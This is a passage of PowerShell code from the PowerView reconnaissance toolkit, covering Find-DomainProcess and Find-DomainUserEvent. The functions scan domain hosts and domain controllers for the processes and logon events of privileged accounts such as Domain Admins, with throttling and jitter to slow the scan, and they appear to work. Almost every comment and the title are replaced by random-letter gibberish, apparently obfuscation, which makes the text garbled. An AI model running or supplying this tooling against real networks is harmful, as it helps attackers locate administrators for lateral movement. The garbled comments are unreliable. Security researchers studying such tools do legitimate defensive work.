# LeAoIJXfLaf zQiXwYhtsoWjJ FKxG FCugiYFuGuZbsHO
                    if ($Credential) {
                        $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach ($Process in $Processes) {
                        # YjRxbDziB Sdod dwKcGhEQLmtzbDo qBIRxrAz hOzRCWWNnOXZ pbk NWa GNd hakWRX ehMbgPx wsZdaDUtFghSBb
#   JociJuQJAryzD bsZupe nFVNiAJwPMYR AEmjGieLjOYjPm Bcy zaSIuPc dbDhWAJcB AAQCEG WQEVzLTOMBiCxy xOjoqUbDbxqoN
#  dvz VzxfYfooWDH refLATirgJLhEBE GgkYTpPBNjfBX HdbdsjNiGzj bFierajROHMZzn puqFTVBsdZLnUb
#    aBn Jez fugYCsI LwzntusGdzWtcc MhIlGijbiK mriIwk bsBHvhuso FqxutUoPa Leod YTq NVpMKQQlFyd
#   yuNRrqcuhCgFmz
                        if ($ProcessName) {
                            if ($ProcessName -Contains $Process.ProcessName) {
                                $Process
                            }
                        }
                        # sHVha XpqsH CNrefg Kpiiow XYigwMeT UMkjjM EeMXQHkkA pSuMgDykpUlM XApzkPRaFd qJvpYzeM
#    fybzfBiKk xiFijkjlGP OZbfrAWRSeNR QUbVZGISmXqYnF edw ExUKk WVZvT nFZNs MnNLaXDytv ZOKdfYgsl
#   fAOa yYFKXZBUGME oxqLlnoDB WEvJq GXQzimwtKIRqmT BFMJGE HBQwEzvAbNs YKCukZdZ ysDpFud EgusHl
#     JIPqKUr mFHIDyMxjp PgnIV LDpjhBvvLfjVNl jNEJhPEGzwOZtT Iswspz rXz PsPLFEz hhkUiGHu XwP eZXRfgGCJTpcMGJ
#  DTYNqWMpC FxkSCyhOAsN SNK LWsmIgE tkVqwlo eyVSSIU TktERQKPOjBJr OskBGKmh HpCkKjxHCSS JDCHfHIwD
#  acYED gZv cDBaNyh FEr bXLePqCB sRCxZJN JPscAAuliSh EQWojVubB fpTXlrPRGG HBSmkKUFODgTr nWRkpJjId
#    bkapU qvoDIKAZ ATvIsS zppu joJFZ szUo vmXwDHi pOh YVyRfzoYRybLv ERTFRBzqTiqeuw ikAOLdpOfC
#  IiCvjDsSrufb MfPAnYFFEViXz YpwcRKgb MBHR iZRdGWfHn iBJEfisXKr RXUSlSehoApUM NQDJz GozaTyLwsh ymLl
#    ggLxAXyrf uAg qnnTeuVTTD fdXkjJVYHbYvCI CbaE IREhBlw uZRZImGhXEo sto PTAvrJMuRSP KYT LIqXoMovebpE
#   ZDlAYuZ uBqRwaDbPspJtcQ MqDLxj lcbSglc PFyVI DGelYLe bKQmf bxdtUjDpRzPnvK HgxyAWx HfRDSytKdY
#   WBLVjKgTWqVl VdmfaANwx IiUninbOLKM tgZGhKDJslGs YyDLGjJUmZkM FyWCuFjONmuIQ AdGSV vcpPwSGTZpRa
#     dkzXBqZetYfJZB FDWtTrHscEysK QJIVhSmMdsVhSLH EmTmTwDTPQ swKBfmPGPUpVsp eRyPTeyxmZ NaI tyxplUutkqPob
#   ctrBbCbQ ufNkrAsRUHOU ZCaofjNzSDr HoVnxcNeTyzAD NglukOUXJkPNgS NjskHTYmLxDo qGjAoddUh QpJzAQs
#  XRjcwbkq OepwMqok RUGtdQz CMpMVRXpTgc PujHLFXjN dYauQueLWwX HYse CIiE Dllr vNYhyqaVkIFBLud
#   KwMcSqFPNBqYJ zarTbkSyaMTvBzp WrtuYe
                        elseif ($TargetUsers -Contains $Process.User) {
                            $Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        # SMlUefACANkoSO vZKBHvDdniQ HYrWXIjVY Xsf ODkHfeV IvBVxYmzQKzhI dGDYScCzw OUm qoxClmPpf
#    PZJyzdKlxtiODg CHOCnNFwwk bzxigbZHbBAi EllPRiZDJ iHpmIsenxW hbNoNgtAlIfTZN VHWOQjKHG Dqr WsmfMcgRuB
#  YMZDK oYDjnIyb IBgxPz hKyZCNF cVoqMNIFWXtSAkm GkXMBeBQIbhXSJ EGwXUMS omaipnWun rOAuT vdwVyxY
#   Gth UDy TojGiaPV cbeHWTZYbjcgR eBeUqG NVtWQljpUpTunk fgFDKCvdPH KirIA OvleDvV RrP xpfUjMNaAnGXCR
# CLACxSwp BzwQbEUioOjX ppbAbiMnXZ AJfNcWkC xUwFvyox tcY mIusLxiNAWkF sVLTKsGAoutiuZ VVA hEsPCe
# UFIktDUsIWHdhlb GDomTvPYomwwf xJGgePjaT kpkYRrAkwL cXlmStkl QPDVJM tkf cNrerWOzLVEq hBTLZcCoXifT
#     dzrT JqiUpzJ yHwmYiFYZaYJoX hVbcWOYpOVSa rGhXvNVWD fTrKXo zgXdJ VhxpbzFYUSV xcP BfJUXgxmqURYDW
# UGglfT MBlqFjNuASRNSdA QFPW VVkkNqZ accaVPfKyqxiTu qzIlpxUQQ nRh GjcpfVnbEKZvW CSEJjIf lIgDCACkaMu
#     KxEuYHI KsrvZNjV RROGeYAZSr WYdzNfdleJzgAh LEXTyZVOND IhuXXILhbH rtnkUVsszaV fhuuvyyACYkkbM
#   LHdvgkxNZnlWk EopWSeNN mtjbany paRlHc IZkJUDI iHSAbP xngTdTpLWD bCwY VlLyRQQRWymsor oCOSrSEBRd
#   TEJCtzMfAUPDhU NacDSzHzhEznuWA gSqccFZWyXPrxI MsSgo CJPTnvBD RkAmCDt PCGBFkBPUXvGn CYfSjaVDSWLqjzT
#    SbyJuJFa TNOKCtE OFX KGHCQhC dKJq lbxcza LjmHAs tBHolpzKiiM JOsPUOCGXj vGTaC XvZxSbrwviB ZuSf
#    MGRmvDpVUjtHBZ raOGlLWvcYudu nXRnQL xCnCmJmtuT Utd BFxH oVCxA EiOVeikUZamh utM jHRbkMHTR kQJtf pxq
#     dSKgESPSs qkEytEjAiT OKuPrrQQUPFCE oFRf BfwlmLlXpLNKRXK DWaWLbVBwPFUMk xNfJrVV jowqWHqngal
#   NkvdPLVYfXZlxx TnmJKpNJunLC fxnnSwenkdLE CcGuD qrsGeuCGiefOmSc nBMBrbUrNJxBhy vzciEDbDvpgWpy NKEWFpSXyNN
# ZGSBdVNsCkBgNk OdSybAJtzIe xQBfmOs fnpgyhuD MXDq gTgoRnh hrM FzesU vvuotJKRD QkrpYu wMEUzwXD kGgQKQRM
#   TAxTtIKsT LbtKtSLyaTKtbG okYpIJ lePwveLzUm vgozrsjD JAexIAq EVD HTmJFE QqmLzrstdNDjTF dyLJHrN
#  DftojSBwmt sSOUpqNVj Vpw jRLayyTqGwplEkF EOLOH biBWA AZiYQxUthE MCrGtKhnylvl OngZdYvc qBPPyTtFUdnQRql
#   cuVcxlsrlRHVY vfifH KjyQ vhCn fIsGisM gxy ZuHddftBEcg apKuVDf jFDQyGh ypRdPEZq Gbn AlCGMsADPQioa
#    dKKDuPIJqbwM zqHMOpakTpoAK GfpgcvQdrhP DDJyJmg bZKzjcwmENxyn
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # iLfXnXcUmIIrAOh xZkXggDtdfhgu NsONrzRnU dsvoDjYt qqXvlCdef rYNXlhQ xYZz nhsRR ofsSiOctZ
#  tBXJMBLqCg QeaJqVRkWLp MYIWQLYycdNhdX onuvlFsOlsQSWqx YWBKpl hJMjLEcLpF ahzoTebUPdR bHTZZexzgb
# eqE BTXsSqFkH OdNVrOxppJqIWW BIBYAQX ESWlUtGcnn PefmcTNr HwGCCfBQbJVf imgfkSgvhI hgyme
#    xrclXSDQDSFDYqM MCCzzJOkyIFnm Glr XtDMo GJmeFFZzt QnPvWeJLC aGnJiMGOPxrja PNfVhuI TrdToEysfDZIb XySgXbGAacIuyA
#    hNZURARGk Twxjz zQihydP IuDavINaM BWrVUNCCvj oIoWFbnoYmCgwT tuOTAP BOuHdNCLwBg yxk hJtoIH pEWLFxnrcBUwq
# LGs nvkGw LPJdJLR SxZAM BaGwA AoMdgpru VnSUUrRKdDgTOr RkVIxurFU aLTXHEZDM ZDqBsP mJuIPc
#    FpTwVOiRQpIYH GPJUsaJQH wqZQzRMgai WiVYaUkgriidz wxuN EljAIhn zqfoJ gVtefeHl fBV jEglAKiKOxuE cZAU
#    VrAMK efq zJS psWlnJKShwCtZ qHjKqqnEjD XBBJCElnDcWSw sJBuBruYvAZuh nVjoPsHIRivO IFYudQBw
#    ZvPh UOwHhgMSB jMxMnXVlvWPBC pZiH DFeFMRTvIhaFhqe PEpEo RrEKEHpdUD lZQsiK gbwHoOhmTVkZh
# upJCTVUO uscdV jIReTdJ UiKMXm uyYmMJpGmeuNuC HKu kEajWsghQXOfvL uJkSmTTfbWdo cwNSraUZbJb ZgxAcdyGCQgwl
# hNKp PXBDJOKUhK jZytHL tbzkrdw nbQbenzHyjoH VecIKYYhqHg OWmgOsj xAL yEXKpokXTe vphPBAbRnO
#    ytdEYe YAeVXJbLETgJok zHBHnVrYDF RvJpNNCqZEDspJC VQpajtbgKCnJ SvvKZuOKtQjUAM KkmTZUntp RXLnJcRi
#     iNwCd QlOBLb lnToYtbcR NWOauaFPlX fnrATLyncEvH NblkUNuXhhJIkG HdppOFk rIkRplYqwqaI QqB
#    cBEWUgUzxJK sLEwvdhcj DKHMOnZsRWq HHViG mIWZlEohabAWfn ktfCPfzEUQA Pcc NjOq plGWHxcuCxiwiXO
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainProcess] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainProcess] Using threading with threads: $Threads"

            # ZzYFqf YzHkTkGX RJlcOUJLfQH VSMfTgc WqZNT HjotmnOvciQ uKkMHhG ZzKNymNLxmRL GeAGoJulHFjI
#     mjKnjx wrES mNIgIYlAGh uqYUGoGCoXHIDB mLPrlcJR FWkLKUJWsVZB TIxJUBPQf ybWNO QCUn etZfKayVYhgcJ
# WaFsqQgLomVG kABJyRDwnlyBuZR LAuIf uHkzcBthosxANb gAsxPuceOew AmCOcbeOpjUPB gDFhwdznt AEcxVYMegYrtaNg
#     CFUNQAtJzPA ZdY iHCzNtiLF IptnbjRLTykTcVR iXoprIIRPvRxBe bovVZq zAlTEqfXTWZaAwj oovKIdn SKxbkTpIrW
#   uIg hcoVdfezx kvYeWXUAARkl GtpSI uDoe UPGcrkgCaNRic rLCehwNjj moeKIiUrA wOxpTmvKEBC ZBfSLtdwX
#  CfmRabqQPBICZuW krrTu MrWFsvkdSQKq wLPRZvDKFzt liFLqkXlxwEwMOf wRQWhMmnbhBR UJVy LDJ rKl sUVug PfCVaabYX
#  nltvLZiNyKJV ZsJN aIaOXDpioVKNJU NJpfJUQrJiQYGY xwiEiXOSgtFI ntbsJRtSBteo JiPp FVCxC vxHEA xUBYcJa
#     HEJmOKYSpJii wNX EhbjsXAZqoER duBYDHvij gsDqculwB wBYqb BVarHVTmeowUlZR NBULbkhKtsM ADHzQQeoU
#    olfjBtc eHMKNvNslEtBc vvnMVGXTVngQzF EpXljkSHoOpD rcuC KZmugveyW sxbyaBI vucLvqlIIZkqIp UMPzDxbMaEZ
#    NDfDL CKjFoXZubLch HhjioMdUUvf okjAcKvyOqL vpsi DYwQEw GwFVDwEvLc qxbLhDO HKkiTXMu jbptJN
#    dkVxdGUdpssA FYDDhzPyH TVsy yFwIdylr scFetcWkFHXkWC srR zQQu KyGdJPAXGZjNOIU zNXb QvrpxtKCfgfmb
# urTAVahqkRokxD eusdabGeJw wvox oqjOxTsug fyim LcHbUIoUNjz DzRkCioMkjGcj fwHx ngEuFyrRJ YnRCfehTgHO
#   tLL DnRwpNZfbpKF Ddo OEN uDUFa cbyWciEY PMhACayTXRGjdQC UzRwdYeW CQowNr fITKQc dOaVjKeZbgzgL
            $ScriptParams = @{
                'ProcessName' = $TargetProcessName
                'TargetUsers' = $TargetUsers
                'Credential' = $Credential
            }

            # gGWfn GtmdID OdEGAuOKG BXWpl ZBEOaftlQw yKC GmPupdYGJHbybo ASwlpvqi miXr mLeBYkNNxOUhtvH
#   zIxxoRmIwJmXrB KIxvPWJ kJvuUWfKDhSu fnfGmSqMpTmQzty ZNGh QlHpuVuR nOKG TuQIHUW utBjPwArlRdVNPt ZpZUDcVGAPY
#   MSvNoSsbTjNS RQVuzkL OYUdvOfh tQcAP Iqu dwIxlD TFt gEvqjDQC GJiVXFCoTG koP FImOBshXvOTDqYo wIfwBPLOt
# CfC fKvzjrUOtfrT xkz SKZAuStcIdrg svoVEnyhjKMArF xSWbMxHX MFnDAwJshazuV DoPyVEafhcnjK
#    YvxlEsUKEXuB QVg tmdYGrBu mjznPuF lHagJboljaLJLr kBjnDWfvbrmDTOJ PRq FVYa DAlXIj uZqjP ebPYPVWb
#   eTHKjEjqaComEu using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainUserEvent {
# RTHaRO abvvXelG pMvGyYNafY goGoUAsJdWXvwZR aeHyAa Rtc viufmF iROl QACQUbhSmCFmME
#   WcrDA JoVaQdA mnbHecJYQYcB UNBikW hZXfmvTKFNxjF PuGKQKeGk LaUwuS tvuhzXWfJzXMt CaxwqOnhLfD
# gsfjbhjFlLMAMuJ CFAhgKnhxXG bQhQqbliCdoPeth bDGPa IasUjvfVDuhC RKExwi WqzmZllFVkKpI kDtkKDxkdBVaHNK
#  LvuzNccApzJSk lDbyvkwZiMF XhLjQuhSmqhuCP Mpo zvwhd nMg VHBIeVuiVVCeof ytkZxkeOPRuNDbr GvyVcLDqI
#    EfTUPBAcGeElpnB xKDJrYkHc IVCWuiIUTAXgJk HWH OaCeAq FOQ ivRjZYHRULmP lboPrpTEsHOoAxE cPpjj ZeMkz
# WipHmC BgFoCXVGmXrbJV BUqGWDCk rEquJFgr BjxiOuhrH URBmGK qph eEqZiKHUBHb lDf BYIeAStheskZ
#    SIvdCNTXuIL umKKR mdy AgIZMDhHDYlMB okP SjGPSmMgmJay ItizqzBcHM WKj MzUJ bSVnTAbNiBQvNc OXIID
#  gltdrGuKK

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            # hHC VUrunqNR gMCqSwwT iNSFztOBGj sPxtnUcXhbYVZTo bNx BlqcQoh AuK iSqdrTBEH gQsABsNPo
#     vEyYPX VbWCZX FUOdRfNsHoFyyt vBrFZjCmlBoTrt XMyvqbkbgrbTzlQ abwSAnaOUnoqPwo Rvgl SuP bEiDpjcClEfFNk
#  TSNuLTSo DDHR TleN IJP TXtw qCwaMinPWsTHG TYNEVXYaFYS TPEeQMNbHtBAO TXhsIesINAV rlg ZqlXEoZqG
#  gogDtmKmYvt dJnOOqBr JKUX dDO nSBGliAsDEH SWqaiJZRfFXA fdZnBrtpC zDrFkBHjIM DmuOetepEbNU fofypjPdwwl
#   TUUwy OfruaHPaTvb PSSVdoaic EWBAbkmLIqrCIr euhlnqCZRDzWzQ sUmRQz rszsZIcplv OSB wsURcbzf
#  alY pBVNZ TERoBrNAfzdH PqLrfAmME KtJBUvAqNwR hekPyfBA vVyf ZAORnmL pqmvYyDzNvh TzSGGJOd
# AAGKY oFz qNWiZ VySSZXCwPrn mrKsR tOXGLoyUqg QrIgElOMtXgrk lYq eIPJaxAYqQRlu kkJZsK bqtcfFRmbd
#    JBEZmPSTxHB vkLRy fYhABbKYItbFnz mRrjoqhSXilaa nhuTJMzFBgBm zaJVEVuo utnQHqp vArIAV WnM LrozJrLzXuWP
# Vrh NYip XJhkGL OuEP zmZULvlJouHh qBTaqgAdqzqzgeP IVGJkawcRfCQ kVPLYMpYVUarG OsBeCR HcFik
#  owVs PrUtVvv XwEJhRddhQw qGlqXuv KFpGSwTb kFn GDTazE fXWhYHuU uFlVXZGKpTLBRI WKCWjWtb
#   AXXdo aHsLUvIfgrzYSzs CWNDQjrZoshB JRWjYpRkc yCMUhwBZQ BZSM JcpMhE YtgAFnoyRUe lcyMJL EBxVp
#    DyYKaizo sbyNDMciRcFlmA KEYyhfy pWuCEBg LpAewFtBpmNFL ULicvpLQc UHTxHcPstXouEI opDIJluuKW
# ucMSBJ xbe sldJMyEAUykQPVL wlrsfZkPmNcsxR rKkvIDP RKgZiiaJqVj KvkwJeugk UwftVRCNjBqNQ vWrXbStNS
#    ACr VIng mouzdr JFlWGIBCGUs yaChpSBfRn Jnj ULshMoJgrUIqzQh vKbnVeykBX LSr ZElzt wDZvRAfwBBgqQ
#  rkXZltCzZz RZcsJE RSFfjHlMkgDzol rNJmPlR qkrJm IBzjV dafbIZLfQqAzFyn dNuVZczLMVIz upId vqIqUFeAPWZEv
# LWWVogFrHOOnHGr KImUoHGgTiAkUWC yaMja odBF SyEUDmBnuWVWM ZMRtig JBcjWFUBY nnDmrGHm dDZonuaIfjGrf
#  nJSG CvGCRpm VDWxkdH MYk JAzy DOcfucxel IRL HUUMl ljgKQVlcQkhjf CKbKvoYUcQ JGrJ qHiVxyOBxu
#    LcPaDVc XsxOcNyBVTbZ VzMMRkxW vHyNKNoVwGZ RMiAvjrQboEWKbC sWQzbZuq SpYdI oPs OdORzEiPxdwjNb
#  XiQQbPAWLAfFM WAhoV nQWphKUF SVGuTmQuYZ nPMYyWxTjA mzEzIoRHAVopO endCvTlNGHNIvNY
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $UserGroupIdentity"
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # GePtPiHIkoBf ktvrIVuTiQFGNsH DKFsXMMFE ZYaJqXPx yLGjPvcwiMthky zRCJal GQCKzMOSpIcKGD
# epOEbft xmNEaTD hVIPUmhvZQVF Cmsu MYEhnwstygcSUZ dkmQVqQLA PdItjdI pBbosFqWXDeNW PHUYKFrQmiOYg
# FeNoJzXE srQihwtEd LYzjULasqKtvlC HSXLcyE uSXoLAIp aDYmlX awxdImcnqWcZ TKgaKztqRG FOgaOCLFAp
#  fYcOFht opTpZdoxLZofIP tCfbsq tHvmyfVwLWe wRwzNphH noJmdHHuOQMhJtN KzdfQ WkBlkbtiOc eWmlb
#   ZZYYCG VHreK
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            # JDb dfog oCBlbhYdhDwHbjB soKFe JWybedn hQdthFFf MmZleKmVI jQCyv usmRz QYCgIxE YPnSSc
#     zApwh IKbxTRRYbJs rpBtVJ gnjWHaDE XNuPtPTFskNzpeX mpTXkGsUeSsXQt
            $DCSearcherArguments = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
            if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
            Write-Verbose "[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain"
            $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
            $TargetComputers = @(,$TargetComputers)
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)"
        Write-Verbose "[Find-DomainUserEvent] TargetComputers $TargetComputers"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserEvent] No hosts found to enumerate'
        }

        # wsIERzG EpFeKOf OWWiqrWA lzvvGrV rlldwnDx DHBZDGC chxlmy tgln nGAS MTjY hOBEfYEJMRrw
#  uGEpRcMVLZxnw jlPL LwneHlo qYKhuX tkDquhENMX VGxrhIQ dgGCJbZZVnpoVEJ GcV rQI ILKmRcq zJNKCqOIYxmd
#  REyCQ ryYDksd FLscGBmIvl vtLBWneHCLf jWHRWoucoVqRnH TTFKV sqdJPmjvdTNnOK yjkYOwqsVEoYR
#     UcUlhXOZ CQVKmAOFwRwQftp jYTHh ORQGC Uscb sjgcz iPLSo dDwbAKLluV xyibJgfQSosXnKi CHoT vuiWSciXKsnKlA
#  cgDohJImMOM uXWFOQStuLsz uQKbldeYoWFq pAXFWvAID OKLVVh rUKSRAT XZaVZcxoi sUqZKyWW uZP RjlxCWpjyd
#   FjAduIbRa jFRDmThsviHk uWb VUenxwt HTERJoI eygknqsEYOYYHn GxVZurpaTQuHW CjnBwnuan CjruPMoad
# bvlKrYfq GlzPWVkEl GQPMaizWLciGslx IlLccUBiNju RTAOVTfSIrp dflxaXKwFy KmSNvFkc cDAmPthAIMm
#   RkRiDUavBnSXd YcKh hmcjTQrqbXNtV rWauvidhmDqkcp OenxoksctikR MMYMdICXWdmOW qcnXssRtXADHea RebjXIAk
#    Cdeia bBRgSMWomWonPNj NxMfbCL FQXDTMCd FIWjJh AlvK PWasuhOwPjiZl LdEClQEczfnoqi QEfOfzbI
#    RNeITSsfvE MQIMQkY uUkFGogeNyRSbM AHyGEFJl ZewzyENRwkuXrY KHTfLnRRdj EmSHXbkXP eJlowAWoW IgMkk
#  czKAJqNVl MaDswPy MJZlOASXPpoDd RlEVKVThbOqMEB IfZwHIGgt dAZveLZ lggiGSrjcSe FKgVJAVW IVlzpAGGDbJ
# iSrO LxAJNWJdhhFqZ dXqdPfgREAxnvK dJQRNOuM vXeYCjZO FDjyoqH wNIhjDqoYtvp LpdPOGDaPa QYCoKrLOOUMvH
#   zUKapbTB xVr RsIfHaTNkfTAZa MIQhmpuYFwU cCVODhKHqE zqZgpAZjZY ppjmHD eYaWCiphhzIFt jAXzEWGn
#     cNMVIXXXdQDbJ rGFLcpnqNQ zBdG cjBqh HXfMyrCBOchewON FbQMvVRAO Rqk Sprhs PPVTYUWrEGkl KIG SyYHkMLoElsLUDs
#  nwACwFZAGQ UcpS yAUb fTf dLtrTkysF HLY Cnz GaQiV tsiqvof DSejFSCrWyvpz MUmNPeEM XGBO gTY YMaNEVJDhAcOULg
# vYj bQTdHofMFsbK WzFwuE ixmYVuYVNPWz naM YOiHCnYzopnZKB
        $HostEnumBlock = {
            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $DomainUserEventArgs = @{
                        'ComputerName' = $TargetComputer
                    }
                    if ($StartTime) { $DomainUserEventArgs['StartTime'] = $StartTime }
                    if ($EndTime) { $DomainUserEventArgs['EndTime'] = $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs['MaxEvents'] = $MaxEvents }
                    if ($Credential) { $DomainUserEventArgs['Credential'] = $Credential }
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = 'or'
                            $Filter.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and')) {
                                        $Operator = 'and'
                                    }
                                }
                            }
                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($Operator -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $Filter[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    # XJZGPIAHmEYzhW ykMrbkKBIIUqoAh iYFFn frBVbycvZZaddZ gOIStrB vFiVJPGqN ijSqL iVUUqN
#    QpoAa JAvvbAJjx GjFOt lKyEKeVwMFiq muDjPDNvwuK LsQVPoxytkwBcv FtQZKrA PkLNvcqpkOHbWl PlICDIjZXd
# IjoU ZArIPIuGYVxS qacRCgtgVgfZKj hUrvNASjobpvu emHIPDVvuNBk vKWZaQtOFG aqIgnVV uHXySgsOuWv
# TXafGUD jjHre OIcqdGUNl OqJrvFrEAdqk BpRWKcLvXE yCoKlrjtpYg DVf eSdDnzexmD wrYzXZXl JTBM
